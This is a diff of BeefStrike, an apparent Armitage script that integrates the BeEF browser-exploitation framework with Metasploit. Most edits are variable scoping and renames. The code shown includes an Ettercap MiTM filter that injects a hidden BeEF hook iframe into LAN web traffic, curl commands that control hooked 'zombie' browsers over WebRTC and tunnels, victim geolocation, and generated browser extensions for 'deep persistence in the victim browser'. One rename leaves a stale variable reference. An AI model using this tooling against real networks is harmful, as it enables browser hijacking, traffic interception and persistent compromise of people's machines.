@@ -1,15 +1,14 @@
-############################ WARNING !!!##################################################
-##																						##
-##		Before beginning to use this script, change all the							    ##
-##	"import" lines ... Obviously you must put the right path for each Library.			##
-##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"		##
-##	I recommend you to run both Teamserver/Metasploit and BeEF on the same host.		##
-##	>>  Find FULL pack of java libs dependencies here: http://ow.ly/JMx09               ##
-##																						##
-##  BeefStrike is a script for Beef and Armitage integration.                           ##
-##		Read the "README file" and watch Youtube video demo to better use it        	##
-##			http://youtube.com/mrbenygreen		[	by @TheBenyGreen  ]                 ##
-##########################################################################################
+############################ WARNING !!!####################################################																						##
+##		Before beginning to use this script, change all the			  ##
+##	"import" lines ... Obviously you must put the right path for each Library.	  ##
+##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"	  ##
+##	I recommend you to run both Teamserver/Metasploit and BeEF on the same host.      ##
+##	>>  Find FULL pack of java libs dependencies here: http://ow.ly/JMx0		  ##
+##						      					  ##
+##  BeefStrike is a script for Beef and Armitage integration.                             ##
+##	Read the "README file" and watch Youtube video demo to better use it              ##
+##		http://youtube.com/mrbenygreen	[	by @TheBenyGreen  ]               ##
+############################################################################################
 import com.eyesopencrew.* from: /root/beef_strike/BeefLib.jar;
 import org.apache.commons.* from: /root/beef_strike/lib/commons-lang-2.5.jar;
 import org.apache.commons.* from: /root/beef_strike/lib/commons-logging-1.1.3.jar;
@@ -95,6 +94,7 @@ menubar(" BeEF ", "beefstrike", 2);
 # menu - access all of beefstrike features
 popup beefstrike {
 	menu "Start" {
+		local('$file2host $webrtc $ippeers $link $link00 $link01 $from $to $fromto $link02 $link03 $link04 $user $urlconnect $filterpath $srvhost $portmonitor $tagtoreplace $sslstriport $pass $mount $mountedfile $file2copy $file2hosturipath $eth0 $filtercontent $handlefilter') ;
 		menu "Control BeEF service" {
 			item "BeEF PATH" {
 			$beefpath = prompt_text("Enter path to BeEF main folder","$beefpath");
@@ -138,7 +138,6 @@ popup beefstrike {
 
 			}
 		item "Connect" {
-			#local('$cmde_param $urlconnect');
 			$beefUrl = prompt_text("BeEF Server (with http://). Don't use 127.0.0.1","http://" . $lhostmsf . ":3000");
 			$user = prompt_text("User","beef");
 			$pass = prompt_text("Password","beef");
@@ -167,7 +166,6 @@ popup beefstrike {
 			item "LAN infection(MiTM)" {
 					$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
 					#show_message("You will be prompt to choose a filter (Example available in Beef_strike folder)");
-					local('$filtercontent $handlefilter $srvhost $portmonitor $tagtoreplace');
 					$portmonitor = prompt_text("TCP Port monitored for HTML tag replace action: ","80");
 					$tagtoreplace = prompt_text("Tag to replace with Beef's hooks","</head>");
 					$filtercontent = "if (ip.proto == TCP && tcp.dst ==" . $portmonitor . ") {\n if (search(DATA.data, \"Accept-Encoding\")) {\n replace(\"Accept-Encoding\", \"Accept-Nothing!\");\n}\n}\n\n if (ip.proto == TCP && tcp.src == 80) {\n if (search(DATA.data, \"" . $tagtoreplace . "\")){ \n replace(\"" . $tagtoreplace . "\", \"</head><iframe src=" . $beefdemo . " width=997 height=0 style=\"visibility: hidden\" scrolling=no frameborder=0 seamless=seamless></iframe>\");\n msg(\"beef injected...\");\n}\n}" ;
@@ -259,8 +257,8 @@ popup beefstrike {
 				$from = prompt_text("from <zombie_ID1>: ","1"); 
 				$to = prompt_text("to <zombie_ID2>: ","2");
 				$fromto = "{\"from\":" . $from . ",\"to\":" . $to . ",\"verbose\":true}" ;
-				$link = "" . $beefUrl . "/api/webrtc/go?token=$key";
-				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link . "";
+				$link00 = "" . $beefUrl . "/api/webrtc/go?token=$key";
+				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link00 . "";
 				cmd($console, "$webrtc");
 				%h = @beef_hosts[$from]; %h2 = @beef_hosts[$to];
 				$ippeers = %h['ip']; $ippeers2 = %h2['ip'];
@@ -268,8 +266,8 @@ popup beefstrike {
 				}
 			item "Peer status" {
 				$fromto = prompt_text("Peer of <zombie_ID>: ","1");
-				$link = "" . $beefUrl . "/api/webrtc/status/" . $fromto . "?token=$key";
-				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X GET " . $link . "";
+				$link01 = "" . $beefUrl . "/api/webrtc/status/" . $fromto . "?token=$key";
+				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X GET " . $link01 . "";
 				cmd($console, "$webrtc");
 				}
 			item "Send msg over Peer" {
@@ -277,8 +275,8 @@ popup beefstrike {
 				$from = prompt_text("from <zombie_ID1>: ","1"); 
 				$to = prompt_text("to <zombie_ID2>: ","2");
 				$fromto = "{\"from\":" . $from . ",\"to\":" . $to . ",\"message\":\"" . $peer . "\"}";
-				$link = "" . $beefUrl . "/api/webrtc/msg?token=$key";
-				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link . "";
+				$link02 = "" . $beefUrl . "/api/webrtc/msg?token=$key";
+				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link02 . "";
 				cmd($console, "$webrtc"); 
 				}
 			item "Peer Go Stealth" {
@@ -286,8 +284,8 @@ popup beefstrike {
 				$from = prompt_text("from <zombie_ID1>: ","1"); 
 				$to = prompt_text("to <zombie_ID2>: ","2");
 				$fromto = "{\"from\":" . $from . ",\"to\":" . $to . ",\"message\":\"" . $peer . "\"}";
-				$link = "" . $beefUrl . "/api/webrtc/msg?token=$key";
-				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link . "";
+				$link03 = "" . $beefUrl . "/api/webrtc/msg?token=$key";
+				$webrtc = "curl -H \"Content-Type: application/json; charset=UTF-8\" -v -X POST -d '" . $fromto . "' " . $link03 . "";
 				cmd($console, "$webrtc"); 
 				}
 			item "Peer End Stealth" {
@@ -357,7 +355,7 @@ popup beefstrike {
 				show_message("To generate browsers Extensions, you need to use Kango Framework. \nDownload it from: http://kangoextensions.com/kango/kango-framework-latest.zip");
 				$kango_path = prompt_text("Absolute Path to kango.py:","/root/kango-framework-latest/kango.py");
 				}
-			item "Beef-Injector" {
+			item "Beef-Implant" {
 				generate_beefcli_plug() ;
 				}
 			item "Beef-Controler" {
@@ -393,14 +391,14 @@ popup beefstrike {
 				$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];sleep(1000);
 				#geomap($json_freegeoip, $maptype, "Empty");
 				println($json_freegeoip);
-				$js = [new JSONObject]; # retrieve location information from geobyte result.
-				$js = [JSONSerializer toJSON: "$json_freegeoip"];
-				$ipmap = [BeefRequester extractMapData: "$js", "ip"] ;
-				$country = [BeefRequester extractMapData: "$js", "country_name"] ;
-				$city = [BeefRequester extractMapData: "$js", "city"] ;
-				$lat = [BeefRequester extractMapData: "$js", "latitude"] ; 	$lon = [BeefRequester extractMapData: "$js", "longitude"] ;
-				#$latlon = [BeefRequester extractGPSData: "$js"] ;
-				$timezone = [BeefRequester extractMapData: "$js", "time_zone"] ; 
+				$jsmap = [new JSONObject]; # retrieve location information from geobyte result.
+				$jsmap = [JSONSerializer toJSON: "$json_freegeoip"];
+				$ipmap = [BeefRequester extractMapData: "$jsmap", "ip"] ;
+				$country = [BeefRequester extractMapData: "$jsmap", "country_name"] ;
+				$city = [BeefRequester extractMapData: "$jsmap", "city"] ;
+				$lat = [BeefRequester extractMapData: "$jsmap", "latitude"] ; 	$lon = [BeefRequester extractMapData: "$jsmap", "longitude"] ;
+				#$latlon = [BeefRequester extractGPSData: "$jsmap"] ;
+				$timezone = [BeefRequester extractMapData: "$jsmap", "time_zone"] ; 
 				$map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&markers=color:red%7Clabel:Z%7C" . $lat . "," . $lon . "&maptype=hybrid";
 				println($map_url);
 				$rndval = rand(9999); $s = "-"; $b = "/" ;
@@ -415,7 +413,6 @@ popup beefstrike {
 				# map tab appear only if the request is made by the user otherwise, the geo-position will be just stored.
 				$map_tab = open_image_tab("Geolocate", @(), @("No Image ? Try to Refresh Map","Map informations"));
 				set_image($map_tab, file_get("" . $mapfile . "")) ;
-				println("zzzzzzzzzzzzzzz");
 				}
 			item "Geo Tracking" {
 				local('$geotrack');
@@ -430,7 +427,7 @@ popup beefstrike {
 			}
 		item "LAN info." {# Returns the entire list of internal network hosts & services for all zombies
 			append($console, "\n[o] Internal Hosts list " . $1 . "");
-			$link4 = "" . $beefUrl . "/api/network/hosts?token=$key";
+			$link04 = "" . $beefUrl . "/api/network/hosts?token=$key";
 			$req = "curl " . $link4 . "";
 			cmd($console , "$req");
 			append($console, "\n[o] Internal Services list " . $1 . "");
@@ -632,12 +629,6 @@ popup zmb_hook {
 				cmd($console , "$request"); 
 				append($console, "\n[o] Send pre-configured request via the tunnel");
 				sleep(2000);
-				cmd($console , "curl --proxy http://127.0.0.1:6789 http://gmail.com");
-				cmd($console , "curl --proxy http://127.0.0.1:6789 http://facebook.com");
-				cmd($console , "curl --proxy http://127.0.0.1:6789 http://yahoo.com");
-				cmd($console , "curl --proxy http://127.0.0.1:6789 http://twitter.com");
-				cmd($console , "curl --proxy http://127.0.0.1:6789 http://linkedin.com");
-				cmd($console , "curl --proxy http://127.0.0.1:6789 http://youtube.com");
 				show_message("Tunnel is ready.");
 				} 
 			menu "WebRTC peer" { 
@@ -807,7 +798,7 @@ sub send_beef_cmd_without_param {
 	}
 $currentrsid = 0 ;
 sub send_batch_cmd {
-	#local('$link2 $attak2') ;
+	local('$link__2') ;
 	$link__2 = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key"; 
 	#$attak__2 = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{" . $3 . "}' -X POST " . $link__2 . "";
 	#cmd_async("$attak__2"); sleep(50); $currentrsid = $currentrsid + 1 ; println($currentrsid);
@@ -1355,6 +1346,7 @@ sub run_driveby {
 	}
 # this action show an info box with details about a particular zombi
 sub zombi_info {
+	local('$SystemPlatform $VBScriptEnabled $HasGoogleGears $JavaEnabled $HasWebSocket $HasFlash $BrowserVersion $BrowserReportedName $BrowserName $BrowserPlugins $HasActiveX $HasFlash $BrowserType $OsName');
    $BrowserName = @browser_profile_list[$1]["Browser"] ;
    $BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
    $BrowserReportedName = @browser_profile_list[$1]["UserAgent"] ;
@@ -1396,6 +1388,7 @@ sub refresh_result_h {
 	}
 #  build a hash value for the hooked browser 
 sub browser_hash {
+	local('$SystemPlatform $JavaEnabled $HasWebSocket $HasFlash $BrowserVersion $BrowserReportedName $BrowserName $nameoffile $fingerprint $resulthash $result_md5 $result_sha $digest_md5 $handlehash $digest_sha');
 	$BrowserName = @browser_profile_list[$1]["Browser"] ;    $BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
 	$BrowserReportedName = @browser_profile_list[$1]["UserAgent"] ;    $BrowserType = @browser_profile_list[$1]["Type"] ;
 	$BrowserVersion = @browser_profile_list[$1]["Version"] ;    $HasActiveX = @browser_profile_list[$1]["ActiveX"] ;
@@ -2337,6 +2330,7 @@ sub import_profil_conf {
 	}
 # #: Check the browser type and version using another web service.
 sub radar {
+	local('$link $request');
 	$link = "http://www.useragentstring.com/?uas=" . $1 . "&getJSON=agent_name";
 	$request = "curl "  . $link . " > ua.txt";
 	cmd($console , "$request");
@@ -2385,6 +2379,7 @@ sub ddosing {
 	}
 # generate Extension for beef injection.
 sub generate_beefcli_plug {
+	local('$name_project_folder $js_to_injected $content_js $homepage_url $plug_creator $plug_name $extension_info_json');
 	show_message("This process will help you to quickly generate \"BeEF Injector\" Extensions for the most populars browsers. \nBy using these Extensions, you will setup a deep persistence in the victim browser. \nSo Please DON'T FORGET TO CLEAN your victim browser after your pentest ... \nMy code doesn't care about it :-(. . \n----------------------------\nTry to make no mistake during the generation process!!! Otherwise your Extension will not be generated");
 	$name_project_folder = prompt_text("Name the project folder :","Beef_Injector");
 	cmd_async("mkdir " . $plug_project . "/" . $name_project_folder . ""); 
@@ -2414,6 +2409,7 @@ sub generate_beefcli_plug {
 	}
 # generate Extension for beef control.
 sub generate_beefsrv_plug {
+	local('$name_project_folder $main_js $plug_iframe_of_popup $plug_description $main_js $homepage_url $plug_creator $plug_name $extension_info_json');
 	show_message("This process will help you to quickly generate \"BeEF Injector\" Extensions for the most populars browsers. \nBy using these Extensions, you will setup a deep persistence in the victim browser. \nSo Please DON'T FORGET TO CLEAN your victim browser after your pentest ... \nMy code doesn't care about it :-(. . \n----------------------------\nTry to make no mistake during the generation process!!! Otherwise your Extensions will not be generated");
 	$name_project_folder = prompt_text("Name the project folder :","beefsrvplug");
 	cmd_async("mkdir " . $plug_project . "/" . $name_project_folder . ""); 
@@ -2440,6 +2436,7 @@ sub generate_beefsrv_plug {
 ########################## ARE-Workshop ###############################################
 # this method build a rules based on the specified profile and related commands
 sub rules_builder {
+	local('$texttosave $addtext $Code $Condition $id $Param $plug_creator $plug_name $extension_info_json');
 	$texttosave = "{" ;
 	$Rule_name = @rule_build[$1]["Rule_name"];
 	$Rule_author = @rule_build[$1]["Rule_author"];
@@ -2450,15 +2447,16 @@ sub rules_builder {
 	$exec_order  = @rule_build[$1]["exec_order"];
 	$exec_delay = @rule_build[$1]["exec_delay"];
 	$chain_mode = @rule_build[$1]["chain_mode"];
-	$addtext = "\n  \"name\": \"" . $Rule_name . "\", \n \"author\": \"" . $Rule_author . "\",  \"browser\": \"" . $Rule_browser . "\",\n  \"browser_version\": \"" . $Rule_browser_vers . "\",\n  \"os\": \"" . $Rule_os . "\",\n  \"os_version\": \"" . $Rule_os_vers . "\",\n  \"modules\": [\n" ;
+	$addtext = " \\\"name\\\": \\\"" . $Rule_name . "\\\",  \\\"author\\\": \\\"" . $Rule_author . "\\\",  \\\"browser\\\": \\\"" . $Rule_browser . "\\\",  \\\"browser_version\\\": \\\"" . $Rule_browser_vers . "\\\",  \\\"os\\\": \\\"" . $Rule_os . "\\\",  \\\"os_version\\\": \\\"" . $Rule_os_vers . "\\\",  \\\"modules\\\": [\n" ;
 	$texttosave = "". $texttosave . "" . $addtext . ""; 
 	for ($i = 0; $i < size(@beef_autorun); $i++ ) {
-		if (@beef_autorun[$i]["category"] eq "" . $Rule_name . "" ) {
-			$name = @beef_autorun[$i]["name"] ;
+		if (@beef_autorun[$i]["name"] eq "" . $Rule_name . "" ) {
+			$id = @beef_autorun[$i]["id"] ;
+			$name = @beef_cmde[$id]["name"];
 			$Param = @beef_autorun[$i]["Param"] ;
 			$Condition = @beef_autorun[$i]["Condition"] ;
 			$Code = @beef_autorun[$i]["Code"] ;
-			$addtext = "{\"name\":\"". $name ."\",\"Condition\":\"". $Condition ."\",\"Code\":\"". $Code ."\",\"options\":\"". $Param ."\"}";
+			$addtext = "{\\\"name\\\":\\\"". $name ."\\\",\\\"Condition\\\":\\\"". $Condition ."\\\",\\\"Code\\\":\\\"". $Code ."\\\",\\\"options\\\":\\\"". $Param ."\\\"}";
 			$texttosave = "". $texttosave . "" . $addtext . ""; 
 			$j = size(@beef_autorun) - 1 ; 
 			if ($i != $j) { $texttosave = "". $texttosave . "," ; }
@@ -2466,17 +2464,18 @@ sub rules_builder {
 			println($addtext);
 		}	
 	$texttosave = "" . $texttosave . "]," ;
-	$addtext = "\n \"execution_order\": \"" . $exec_order . "\", \n \"execution_delay\": \"" . $exec_delay . "\",  \"chain_mode\": \"" . $chain_mode . "\"}" ;
+	$addtext = " \\\"execution_order\\\": \\\"" . $exec_order . "\\\",  \\\"execution_delay\\\": \\\"" . $exec_delay . "\\\",  \\\"chain_mode\\\": \\\"" . $chain_mode . "\\\"}" ;
 	$texttosave = "". $texttosave . "" . $addtext . ""; 
 	println($texttosave);
 	$savefilename  = "" . $Rule_name . ".json" ; # dot json extension is added at the end.
-	cmd($console , "echo '" . $texttosave . "' > " . $bstrk_AREWorkshop . "/" . $savefilename . "");
+	cmd($console , "echo $texttosave > " . $bstrk_AREWorkshop . "/" . $savefilename . "");
 	show_message("Rule is ready. You can modify or publish it now");
 	file_get($endp );
 	append($console , "\n\c9[+] Rule is ready. You can modify or publish it now " );
 	}
 # this method publish a rule provided by the user.
 sub rules_publish {
+	local('$rulejson $are_request');
 	$rulejson = "" . $1 . ".json";
 	cmd($console , "cp " . $bstrk_AREWorkshop . "/$rulejson " . $beefpath "/arerules/enabled");
 	$link = "" . $beefUrl . "/api/autorun/rule/add?token=$key";
@@ -2490,12 +2489,12 @@ sub refresh_enabled {
 	table_set($1, @rule_enabled);
 	}
 sub rules_list {
+	local('$getare $are_request $aresize');
 	if ( $key ne "00000000000000000000000") { 
 		$link = "" . $beefUrl . "/api/autorun/rule/list/all?token=$key";
 		$are_request = "curl "  . $link . "";
 		append($console, "\n\c9[+] list of ARE-rule enabled:");
 		cmd($console , "$are_request");
-	
 		$getare = [BeefRequester BeefGetRequest: "$link"]; sleep(50);
 		$aresize = [AreRulesList AreRules_size: "$getare"]; sleep(50);
 		for ($i = 0; $i < $aresize; $i++){
@@ -2509,6 +2508,7 @@ sub rules_list {
 	}
 # This method delete a published rule provided by the user.
 sub rules_delete {
+	local('$are_request');
 	#$idrule = prompt_text("Rule ID : ","0");
 	$link = "" . $beefUrl . "/api/autorun/rule/delete/" . $idrule . "?token=$key";
 	$are_request = "curl "  . $link . "";
@@ -2541,7 +2541,7 @@ sub edit_rules_param {
 	$Rule_author = prompt_text("Name of the Author : ","$Rule_author");
 	$Rule_browser = prompt_text("Browser type(FF,C,IE,S,O,ALL): ","$Rule_browser");
 	$Rule_browser_vers = prompt_text("Name of the Author : ","$Rule_browser_vers");
-	$Rule_os = prompt_text("Linux,Windows,OSX,Android,iOS,BlackBerry,ALL : ","$Rule_os");
+	$Rule_os = prompt_text("Linux,Windows,OSX,Android,iOS,ALL : ","$Rule_os");
 	$Rule_os_vers = prompt_text("OS version (<,<=,==,>=,>,ALL,Vista,XP) : ","$Rule_os_vers");
 	$exec_order = prompt_text("Execution Order : ","$exec_order");
 	$exec_delay = prompt_text("Execution delay : ","$exec_delay");
@@ -2551,6 +2551,7 @@ sub edit_rules_param {
 	}	
 # This method trigger a rule selected by the user.
 sub rules_trigger {
+	local('$link $are_request');
 	#$idrule = prompt_text("Rule ID : ", "$1");
 	$link = "" . $beefUrl . "/api/autorun/rule/trigger/" . $1 . "?token=$key";
 	$are_request = "curl " . $link . "";
